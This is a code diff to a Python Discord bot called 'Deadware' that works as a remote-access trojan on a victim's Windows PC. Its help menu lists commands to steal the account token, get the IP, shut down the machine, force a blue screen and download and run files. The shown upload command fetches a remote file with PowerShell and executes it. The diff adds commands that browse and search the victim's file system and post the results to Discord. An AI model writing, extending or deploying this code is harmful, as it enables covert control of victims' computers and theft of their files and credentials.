@@ -881,7 +881,7 @@ async def deadware_bomb(ctx):
 async def help(ctx):
     await ctx.message.delete()
     embed = discord.Embed(title='Deadware Commands', description=' ', colour=RandomColor())
-    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC')
+    embed.add_field(name='Command List', value='test_con - tests connection\ncreate_file <filename> - creates a file\nstart_process <process> - starts process\ncomputer_shutdown - shuts down computer\ndeadware_bomb - messes with computer\nget_token - gets selfbot token\nstart_typing <message> - opens notepad and types message\nget_ip - gets machine IP\nend_task <task> - ends a task\nget_tasks - gets current processes running\nget_netstat - gets netstat output\nblue_screen - blue screen of death\nerror_drawing - cursor error drawing\nupload <uri> <filename> - uploads a file and runs it on their PC\ncwd - gets currenct working directory\ndir - lists folders in directory\next_search <file extention> - searches for file with extention\nchange_dir <folder> - changes file directory')
 
     await ctx.send(embed=embed)
 
@@ -975,6 +975,32 @@ async def upload(ctx, *, url, file_name):
     await ctx.message.delete()
     subprocess.call(f'C:\Windows\System32\powershell.exe Invoke-WebRequest -Uri {url} -OutFile .\{file_name}; .\{file_name}', shell=True)
 
+@Deadware.command()
+async def cwd(ctx):
+    await ctx.message.delete()
+    cwd = os.getcwd()
+    await ctx.send(f'```{cwd}```')
+
+import glob
+@Deadware.command()
+async def dir(ctx):
+    directory = glob.glob('*/')
+    await ctx.message.delete()
+    for dirs in directory:
+        await ctx.send(dirs)
+
+@Deadware.command()
+async def ext_search(ctx, *, ext):
+    await ctx.message.delete()
+    file_type = glob.glob(f'*{ext}')
+    for files in file_type:
+        await ctx.send(files)
+
+@Deadware.command()
+async def change_dir(ctx, *, dir):
+    await ctx.message.delete()
+    os.chdir(dir) 
+    await ctx.send(f'Changed directory')
 
 loop.create_task(Deadcord.start(token, bot=False))
 loop.create_task(Deadware.start('BOT-TOKEN-HERE')) #CHANGE THIS
@@ -983,4 +1009,3 @@ try:
     loop.run_forever()
 except:
     loop.stop()
-
